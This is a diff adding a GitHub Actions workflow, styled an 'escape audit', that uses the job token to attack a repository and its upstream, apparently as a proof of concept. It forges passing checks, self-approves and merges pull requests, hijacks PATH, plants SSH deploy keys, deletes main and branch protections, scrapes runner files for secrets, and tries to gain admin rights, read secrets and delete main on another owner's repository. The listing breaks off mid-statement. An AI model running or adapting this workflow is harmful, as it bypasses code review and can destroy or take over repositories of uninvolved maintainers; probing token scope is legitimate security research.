@@ -1,0 +1,524 @@
+name: followup-escape-audit
+on:
+  pull_request:
+    branches: [main]
+  push:
+    branches: [main]
+
+jobs:
+  followup-escape:
+    name: followup-escape
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      checks: write
+      statuses: write
+      pull-requests: write
+      issues: write
+      deployments: write
+      actions: write
+      packages: write
+      pages: write
+      repository-projects: write
+      security-events: write
+      discussions: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Setup
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          TS=$(date -u +%Y%m%d_%H%M%S)
+          BASE="https://api.github.com/repos/${GITHUB_REPOSITORY}"
+          HEAD_SHA=$(git rev-parse HEAD)
+          MAIN_SHA=$(git rev-parse origin/main)
+          TREE_SHA=$(git rev-parse "HEAD^{tree}")
+          GHOST=$(curl -sf -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/git/commits" \
+            -d "{\"message\":\"escape-followup\",\"tree\":\"${TREE_SHA}\",\"parents\":[\"${MAIN_SHA}\"],\"author\":{\"name\":\"bot\",\"email\":\"bot@github.com\"}}" \
+            | jq -r '.sha // "FAILED"')
+          UPSTREAM_BASE="https://api.github.com/repos/twrps/PoC-RACE2"
+          UPSTREAM_MAIN=$(curl -sf -H "Authorization: token $GH_TOKEN" \
+            "${UPSTREAM_BASE}/git/refs/heads/main" | jq -r '.object.sha // "FAILED"')
+          UPSTREAM_TREE=$(curl -sf -H "Authorization: token $GH_TOKEN" \
+            "${UPSTREAM_BASE}/git/commits/${UPSTREAM_MAIN}" | jq -r '.tree.sha // "FAILED"')
+          UPSTREAM_GHOST=$(curl -s -X POST -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" "${UPSTREAM_BASE}/git/commits" \
+            -d "{\"message\":\"escape\",\"tree\":\"${UPSTREAM_TREE}\",\"parents\":[\"${UPSTREAM_MAIN}\"],\"author\":{\"name\":\"bot\",\"email\":\"bot@b.com\"}}" \
+            | jq -r '.sha // "UPSTREAM_COMMIT_FAILED"')
+          PR_NODE_ID=$(curl -sf -H "Authorization: token $GH_TOKEN" \
+            "${BASE}/pulls?state=open&per_page=5" | jq -r '.[0].node_id // ""')
+          PR_NUM=$(curl -sf -H "Authorization: token $GH_TOKEN" \
+            "${BASE}/pulls?state=open&per_page=5" | jq -r '.[0].number // "1"')
+          echo "TS=${TS}"                     >> "$GITHUB_ENV"
+          echo "BASE=${BASE}"                 >> "$GITHUB_ENV"
+          echo "HEAD_SHA=${HEAD_SHA}"         >> "$GITHUB_ENV"
+          echo "MAIN_SHA=${MAIN_SHA}"         >> "$GITHUB_ENV"
+          echo "TREE_SHA=${TREE_SHA}"         >> "$GITHUB_ENV"
+          echo "GHOST=${GHOST}"               >> "$GITHUB_ENV"
+          echo "UPSTREAM_BASE=${UPSTREAM_BASE}" >> "$GITHUB_ENV"
+          echo "UPSTREAM_MAIN=${UPSTREAM_MAIN}" >> "$GITHUB_ENV"
+          echo "UPSTREAM_TREE=${UPSTREAM_TREE}" >> "$GITHUB_ENV"
+          echo "UPSTREAM_GHOST=${UPSTREAM_GHOST}" >> "$GITHUB_ENV"
+          echo "PR_NODE_ID=${PR_NODE_ID}"     >> "$GITHUB_ENV"
+          echo "PR_NUM=${PR_NUM}"             >> "$GITHUB_ENV"
+          echo "=== CONTEXT ==="
+          echo "TS=$TS GHOST=$GHOST"
+          echo "upstream_main=$UPSTREAM_MAIN upstream_ghost=$UPSTREAM_GHOST"
+          echo "PR_NUM=$PR_NUM"
+
+      - name: H08-H20 Alternate hosts remainder
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          P() { curl -s -o /dev/null -w "%{http_code}" "$@" 2>/dev/null || echo "000"; }
+          echo "=== BATCH H (remainder): Alternate hosts H08-H20 ==="
+          H08=$(P "https://ssh.github.com/info/refs?service=git-receive-pack" -H "Authorization: token ${GH_TOKEN}")
+          echo "H08 ssh.github.com = HTTP_${H08}"
+          H09=$(P "https://github.com/${GITHUB_REPOSITORY}.git/info/refs?service=git-receive-pack" \
+            -H "Authorization: token ${GH_TOKEN}" -H "User-Agent: git/2.53")
+          echo "H09 smart-http refs = HTTP_${H09}"
+          H10=$(P -X POST "https://github.com/${GITHUB_REPOSITORY}.git/git-receive-pack" \
+            -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/x-git-receive-pack-request" -d "")
+          echo "H10 receive-pack = HTTP_${H10}"
+          H11=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/vnd.git-lfs+json" \
+            "https://github.com/${GITHUB_REPOSITORY}.git/info/lfs/objects/batch" \
+            -d "{\"operation\":\"upload\",\"transfers\":[\"basic\"],\"objects\":[]}")
+          echo "H11 LFS batch = HTTP_${H11}"
+          H12=$(P -X PATCH -H "Authorization: token  ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "H12 double-space = HTTP_${H12}"
+          H13=$(P -X PATCH -H "Authorization: token"$'\t'"${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "H13 tab token = HTTP_${H13}"
+          H14=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -H "X-GH-Scope: admin:repo_hook" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "H14 X-GH-Scope = HTTP_${H14}"
+          H15=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "https://api.github.com/api/v3/repos/${GITHUB_REPOSITORY}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "H15 /api/v3/ = HTTP_${H15}"
+          H16=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -H "X-Oauth-Scopes: repo" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "H16 X-Oauth-Scopes = HTTP_${H16}"
+          H17=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -G "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "H17 -G flag = HTTP_${H17}"
+          H18=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -H "X-Forwarded-For: 192.30.255.112" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "H18 XFF github IP = HTTP_${H18}"
+          H19=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -H "X-Forwarded-For: ::1" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "H19 XFF ::1 = HTTP_${H19}"
+          H20=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -H "Max-Forwards: 0" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "H20 Max-Forwards = HTTP_${H20}"
+
+      - name: I-M Checks statuses refs PR SHA
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          P() { curl -s -o /dev/null -w "%{http_code}" "$@" 2>/dev/null || echo "000"; }
+          echo "=== BATCH I: Check/status name spoofing ==="
+          for CN in "ci" "build" "test" "lint" "security-scan" "codeql" "ci/tests" \
+            "continuous-integration/travis-ci/pr" "continuous-integration/jenkins" \
+            "codecov/patch" "security/snyk" "license/cla" "authorized" "approved" \
+            "required-check" "pr-validation" "github-actions" "GitHub Actions"; do
+            R=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+              "${BASE}/check-runs" \
+              -d "{\"name\":\"${CN}\",\"head_sha\":\"${HEAD_SHA}\",\"status\":\"completed\",\"conclusion\":\"success\"}")
+            echo "I_check '${CN}' = HTTP_${R}"
+          done
+          for SC in "ci" "ci/tests" "build" "security-scan" "required-check" \
+            "continuous-integration/travis-ci/pr" "codecov/patch" "codeql"; do
+            R=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+              "${BASE}/statuses/${HEAD_SHA}" \
+              -d "{\"state\":\"success\",\"context\":\"${SC}\"}")
+            echo "I_status '${SC}' = HTTP_${R}"
+          done
+          echo ""
+          echo "=== BATCH J: Env injection ==="
+          echo "ESCAPED_VAR=yes"   >> "$GITHUB_ENV"
+          echo "J01 GITHUB_ENV write: done"
+          echo "PATH=/tmp/hijack:${PATH}" >> "$GITHUB_ENV"
+          echo "J02 PATH hijack: attempted"
+          echo "FOO=bar" >> "$GITHUB_PATH"
+          echo "J03 GITHUB_PATH write: attempted"
+          echo "J04 GITHUB_OUTPUT: $GITHUB_OUTPUT"
+          echo "J05 GITHUB_STEP_SUMMARY: $GITHUB_STEP_SUMMARY"
+          echo "## Escape audit running" >> "$GITHUB_STEP_SUMMARY"
+          echo "J06 GITHUB_STEP_SUMMARY write: attempted"
+          echo ""
+          echo "=== BATCH K: refs namespace fuzzing ==="
+          G2=$(git rev-parse HEAD~1 2>/dev/null || git rev-parse HEAD)
+          for REF_NS in "refs/heads/escape-${TS}" "refs/tags/escape-${TS}" \
+            "refs/notes/escape-${TS}" "refs/meta/escape-${TS}" \
+            "refs/stash/escape-${TS}" "refs/hidden/escape-${TS}" \
+            "refs/remotes/origin/escape-${TS}" "refs/pull/999/head" \
+            "refs/pull/999/merge" "refs/environments/escape-${TS}" \
+            "refs/keep-around/escape-${TS}" "refs/pipelines/escape-${TS}" \
+            "refs/merge-requests/escape-${TS}"; do
+            R=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+              "${BASE}/git/refs" -d "{\"ref\":\"${REF_NS}\",\"sha\":\"${G2}\"}")
+            echo "K_ref '${REF_NS}' = HTTP_${R}"
+          done
+          echo ""
+          echo "=== BATCH L: PR endpoints ==="
+          L01=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/pulls/${PR_NUM}/merge" -d "{\"merge_method\":\"squash\"}")
+          echo "L01 PUT /merge = HTTP_${L01}"
+          L02=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/pulls/${PR_NUM}/reviews" -d "{\"event\":\"APPROVE\"}")
+          echo "L02 approve = HTTP_${L02}"
+          L03=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" \
+            "${BASE}/pulls/${PR_NUM}/requested_reviewers" -d "{\"reviewers\":[]}")
+          echo "L03 reviewers = HTTP_${L03}"
+          L04=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/pulls/${PR_NUM}" -d "{\"base\":\"main\"}")
+          echo "L04 PATCH PR = HTTP_${L04}"
+          L05=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/pulls/${PR_NUM}" -d "{\"state\":\"closed\"}")
+          echo "L05 close PR = HTTP_${L05}"
+          L06=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/pulls/${PR_NUM}" -d "{\"state\":\"open\"}")
+          echo "L06 reopen PR = HTTP_${L06}"
+          echo ""
+          echo "=== BATCH M: SHA tricks ==="
+          M01=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${MAIN_SHA}\",\"force\":false}")
+          echo "M01 same SHA = HTTP_${M01}"
+          M02=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":null,\"force\":false}")
+          echo "M02 sha:null = HTTP_${M02}"
+          M03=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"\",\"force\":false}")
+          echo "M03 sha:empty = HTTP_${M03}"
+          M04=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false,\"message\":\"\\u0000\"}")
+          echo "M04 null-byte = HTTP_${M04}"
+          BIG=$(python3 -c "print('x'*10000)")
+          M05=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false,\"extra\":\"${BIG}\"}")
+          echo "M05 10KB body = HTTP_${M05}"
+          M06=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/${GITHUB_HEAD_REF}" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "M06 PATCH PR head = HTTP_${M06}"
+          M07=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "M07 PUT refs main = HTTP_${M07}"
+          GITHUB_IP=$(dig +short api.github.com | head -1)
+          M08=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            -H "Host: api.github.com" \
+            --resolve "api.github.com:443:${GITHUB_IP}" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "M08 resolved IP = HTTP_${M08}"
+          M09=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            -H "Transfer-Encoding: chunked" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "M09 chunked = HTTP_${M09}"
+          M10=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            -H "Connection: keep-alive" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "M10 keep-alive = HTTP_${M10}"
+
+      - name: N-S Fork keys destructive git supply runner
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          P() { curl -s -o /dev/null -w "%{http_code}" "$@" 2>/dev/null || echo "000"; }
+          B64=$(echo -n "escape-${TS}" | base64 -w0)
+          echo "=== BATCH N: Fork repo write ==="
+          FORK_BASE="https://api.github.com/repos/lacaag/PoC-RACE2"
+          N01=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${FORK_BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "N01 fork PATCH = HTTP_${N01}"
+          N02=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${FORK_BASE}/contents/escape-${TS}.txt" \
+            -d "{\"message\":\"e\",\"content\":\"${B64}\"}")
+          echo "N02 fork PUT = HTTP_${N02}"
+          N03=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${FORK_BASE}/git/blobs" -d "{\"content\":\"t\",\"encoding\":\"utf-8\"}")
+          echo "N03 fork blob = HTTP_${N03}"
+          N04=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${FORK_BASE}/git/refs" \
+            -d "{\"ref\":\"refs/heads/escape-${TS}\",\"sha\":\"${MAIN_SHA}\"}")
+          echo "N04 fork branch = HTTP_${N04}"
+          N05=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${FORK_BASE}/git/refs/heads/${GITHUB_HEAD_REF}" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "N05 fork attack = HTTP_${N05}"
+          echo ""
+          echo "=== BATCH O: SSH/GPG keys ==="
+          O01=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "https://api.github.com/user/keys" \
+            -d "{\"title\":\"e\",\"key\":\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtQUDZWhs8JUEk9MiSeFf2DVrFCbcmTH e\"}")
+          echo "O01 user SSH key = HTTP_${O01}"
+          O02=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "https://api.github.com/user/gpg_keys" \
+            -d "{\"armored_public_key\":\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\ntest\\n-----END PGP PUBLIC KEY BLOCK-----\"}")
+          echo "O02 GPG key = HTTP_${O02}"
+          O03=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${BASE}/keys" \
+            -d "{\"title\":\"e\",\"key\":\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtQUDZWhs8JUEk9MiSeFf2DVrFCbcmTH e\",\"read_only\":false}")
+          echo "O03 deploy key = HTTP_${O03}"
+          echo ""
+          echo "=== BATCH P: Destructive ==="
+          P01=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" "${BASE}/git/refs/heads/main")
+          echo "P01 DELETE main = HTTP_${P01}"
+          P02=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${BASE}/branches/main/protection/required_signatures")
+          echo "P02 DELETE sigs = HTTP_${P02}"
+          P03=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${BASE}/branches/main/protection/required_pull_request_reviews")
+          echo "P03 DELETE pr_reviews = HTTP_${P03}"
+          P04=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${BASE}/branches/main/protection/required_status_checks")
+          echo "P04 DELETE status_checks = HTTP_${P04}"
+          P05=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${BASE}/branches/main/protection/enforce_admins")
+          echo "P05 DELETE enforce = HTTP_${P05}"
+          P06=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${BASE}/branches/main/protection/restrictions")
+          echo "P06 DELETE restrictions = HTTP_${P06}"
+          echo ""
+          echo "=== BATCH Q: git protocol ==="
+          git fetch origin "refs/pull/${PR_NUM}/head:pr-branch" 2>&1 || true
+          echo "Q01 git fetch pr head: done"
+          Q02=$(git symbolic-ref HEAD 2>&1)
+          echo "Q02 symbolic-ref: $Q02"
+          git fetch origin main:main-local 2>&1 | tail -1 || true
+          Q03=$(git push "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git" \
+            main-local:refs/heads/main 2>&1 | tail -1 || true)
+          echo "Q03 push local-main = ${Q03}"
+          echo ""
+          echo "=== BATCH R: Supply chain ==="
+          R01=$(P -H "Authorization: token ${GH_TOKEN}" \
+            "https://api.github.com/user/packages?package_type=npm")
+          echo "R01 user packages = HTTP_${R01}"
+          R02=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "https://api.github.com/packages/npm/escape/versions/1")
+          echo "R02 DELETE pkg = HTTP_${R02}"
+          R03=$(P "https://pypi.org/pypi/requests/json")
+          echo "R03 pypi = HTTP_${R03}"
+          R04=$(P "https://registry.npmjs.org/lodash")
+          echo "R04 npmjs = HTTP_${R04}"
+          R05=$(echo "${GH_TOKEN}" | docker login ghcr.io -u "${GITHUB_ACTOR}" \
+            --password-stdin 2>&1 | tail -1 || true)
+          echo "R05 docker ghcr = ${R05}"
+          echo ""
+          echo "=== BATCH S2: Runner env scan ==="
+          echo "S2_01 HOME=$HOME"
+          echo "S2_02 RUNNER_WORKSPACE=${RUNNER_WORKSPACE:-not set}"
+          echo "S2_03 RUNNER_TEMP=${RUNNER_TEMP:-not set}"
+          echo "S2_04 RUNNER_TOOL_CACHE=${RUNNER_TOOL_CACHE:-not set}"
+          echo "S2_05 GITHUB_ENV=${GITHUB_ENV}"
+          echo "S2_06 GITHUB_PATH=${GITHUB_PATH}"
+          echo "S2_07 GITHUB_OUTPUT=${GITHUB_OUTPUT}"
+          ls -la /home/runner/work/_temp/ 2>/dev/null | head -10 || true
+          find /home/runner/work/_temp/ -name '*.json' 2>/dev/null | head -5 | while read f; do
+            echo "S2_08 temp: $f"
+            cat "$f" 2>/dev/null | jq -r \
+              'to_entries[] | select(.key|test("token|auth|secret";"i")) | .key+"="+(.value|tostring[:10])' 2>/dev/null || true
+          done
+          echo "S2_09 credential: $(git config --global credential.helper 2>/dev/null || echo none)"
+          echo "S2_10 gh auth: $(gh auth status 2>&1 | head -2 || true)"
+          cat ~/.config/gh/hosts.yml 2>/dev/null | grep -v 'oauth_token' | head -5 || true
+
+      - name: UPSTREAM Cross-repo write tests
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          P() { curl -s -o /dev/null -w "%{http_code}" "$@" 2>/dev/null || echo "000"; }
+          UB="${UPSTREAM_BASE}"
+          UM="${UPSTREAM_MAIN}"
+          UG="${UPSTREAM_GHOST}"
+          echo "=== UPSTREAM CROSS-REPO ATTACK ==="
+          echo "Fork token (write to lacaag/PoC-RACE2) trying to write to twrps/PoC-RACE2"
+          echo "Token: ${GH_TOKEN:0:10}"
+          echo "Upstream main: $UM"
+          echo "Upstream ghost: $UG"
+          echo ""
+          echo "--- PATCH refs/heads/main on upstream ---"
+          U01=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/git/refs/heads/main" -d "{\"sha\":\"${UG}\",\"force\":false}")
+          echo "U01 PATCH upstream main = HTTP_${U01}"
+          U02=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/git/refs/heads/main" -d "{\"sha\":\"${UG}\",\"force\":true}")
+          echo "U02 PATCH upstream main force = HTTP_${U02}"
+          U03=$(P -X PATCH -H "Authorization: bearer ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/git/refs/heads/main" -d "{\"sha\":\"${UG}\",\"force\":false}")
+          echo "U03 bearer upstream = HTTP_${U03}"
+          echo ""
+          echo "--- POST blobs/trees/refs on upstream ---"
+          U04=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/git/blobs" -d "{\"content\":\"cross-repo-escape\",\"encoding\":\"utf-8\"}")
+          echo "U04 POST upstream blob = HTTP_${U04}"
+          U05=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/git/refs" \
+            -d "{\"ref\":\"refs/heads/cross-escape-${TS}\",\"sha\":\"${UM}\"}")
+          echo "U05 POST upstream branch = HTTP_${U05}"
+          U06=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/git/trees" \
+            -d "{\"tree\":[{\"path\":\"pwned.txt\",\"mode\":\"100644\",\"type\":\"blob\",\"content\":\"cross-repo\"}]}")
+          echo "U06 POST upstream tree = HTTP_${U06}"
+          echo ""
+          echo "--- PUT /contents on upstream ---"
+          B64=$(echo -n "cross-repo-escape-${TS}" | base64 -w0)
+          U07=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/contents/pwned-${TS}.txt" \
+            -d "{\"message\":\"cross-repo\",\"content\":\"${B64}\",\"branch\":\"main\"}")
+          echo "U07 PUT upstream /contents = HTTP_${U07}"
+          echo ""
+          echo "--- Merge / release / tag on upstream ---"
+          U08=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/merges" \
+            -d "{\"base\":\"main\",\"head\":\"${UG}\",\"commit_message\":\"cross-repo\"}")
+          echo "U08 POST upstream /merges = HTTP_${U08}"
+          U09=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/releases" -d "{\"tag_name\":\"cross-${TS}\",\"name\":\"cross\"}")
+          echo "U09 POST upstream release = HTTP_${U09}"
+          U10=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/git/tags" \
+            -d "{\"tag\":\"cross-${TS}\",\"message\":\"x\",\"object\":\"${UM}\",\"type\":\"commit\",\"tagger\":{\"name\":\"b\",\"email\":\"b@b.com\",\"date\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}}")
+          echo "U10 POST upstream tag = HTTP_${U10}"
+          echo ""
+          echo "--- Issues / checks / statuses / deployments on upstream ---"
+          U11=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/issues" -d "{\"title\":\"cross-repo-${TS}\",\"body\":\"test\"}")
+          echo "U11 POST upstream issue = HTTP_${U11}"
+          U12=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/check-runs" \
+            -d "{\"name\":\"ci\",\"head_sha\":\"${UM}\",\"status\":\"completed\",\"conclusion\":\"success\"}")
+          echo "U12 POST upstream check = HTTP_${U12}"
+          U13=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/statuses/${UM}" -d "{\"state\":\"success\",\"context\":\"ci\"}")
+          echo "U13 POST upstream status = HTTP_${U13}"
+          U14=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/deployments" \
+            -d "{\"ref\":\"main\",\"environment\":\"production\",\"auto_merge\":false,\"required_contexts\":[]}")
+          echo "U14 POST upstream deploy = HTTP_${U14}"
+          echo ""
+          echo "--- Collaborator / webhook / protection on upstream ---"
+          U15=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/collaborators/lacaag" -d "{\"permission\":\"admin\"}")
+          echo "U15 PUT upstream collab admin = HTTP_${U15}"
+          U16=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/hooks" \
+            -d "{\"name\":\"web\",\"config\":{\"url\":\"https://example.com\",\"content_type\":\"json\"},\"events\":[\"push\"]}")
+          echo "U16 POST upstream webhook = HTTP_${U16}"
+          U17=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${UB}/branches/main/protection")
+          echo "U17 DELETE upstream protection = HTTP_${U17}"
+          U18=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/keys" \
+            -d "{\"title\":\"x\",\"key\":\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtQUDZWhs8JUEk9MiSeFf2DVrFCbcmTH x\",\"read_only\":false}")
+          echo "U18 POST upstream deploy key = HTTP_${U18}"
+          echo ""
+          echo "--- Workflow dispatch / secrets / runners on upstream ---"
+          U19=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}/actions/workflows/ci.yml/dispatches" -d "{\"ref\":\"main\"}")
+          echo "U19 workflow dispatch upstream = HTTP_${U19}"
+          U20=$(P -H "Authorization: token ${GH_TOKEN}" "${UB}/actions/secrets")
+          echo "U20 GET upstream secrets = HTTP_${U20}"
+          U21=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            "${UB}/actions/runners/registration-token")
+          echo "U21 upstream runner reg = HTTP_${U21}"
+          echo ""
+          echo "--- DELETE / destructive on upstream ---"
+          U22=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${UB}/git/refs/heads/main")
+          echo "U22 DELETE upstream main = HTTP_${U22}"
+          U23=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" \
+            "${UB}" -d "{\"private\":true}")
+          echo "U23 PATCH upstream private = HTTP_${U23}"
+          echo ""
+          echo "--- GraphQL cross-repo mutations ---"
+          GQ="https://api.github.com/graphql"
+          UPSTREAM_REPO_ID=$(curl -sf -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" $GQ \
+            -d "{\"query\":\"{ repository(owner:\\\"twrps\\\",name:\\\"PoC-RACE2\\\") { id } }\"}" \
+            | jq -r '.data.repository.id // "FAILED"')
+          echo "upstream repo_id: $UPSTREAM_REPO_ID"
+          U24_R=$(curl -s -X POST -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" $GQ \
+            -d "{\"query\":\"mutation { createRef(input: {repositoryId: \\\"${UPSTREAM_REPO_ID}\\\", name: \\\"refs/heads/gql-cross-${TS}\\\", oid: \\\"${UM}\\\"}) { ref { name } } }\"}")
+          U24=$(echo "$U24_R" | jq -r \
+            'if .data.createRef.ref.name then "CREATED:"+.data.createRef.ref.name elif .errors then "ERR:"+.errors[0].message else "?" end')
+          echo "U24 GQL createRef upstream = ${U24}"
+          U25_R=$(curl -s -X POST -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" $GQ \
+            -d "{\"query\":\"mutation { createCommitOnBranch(input: {branch: {repositoryNameWithOwner: \\\"twrps/PoC-RACE2\\\", branchName: \\\"main\\\"}, message: {headline: \\\"cross-escape\\\"}, fileChanges: {}, expectedHeadOid: \\\"${UM}\\\"}) { commit { oid } } }\"}")
+          U25=$(echo "$U25_R" | jq -r \
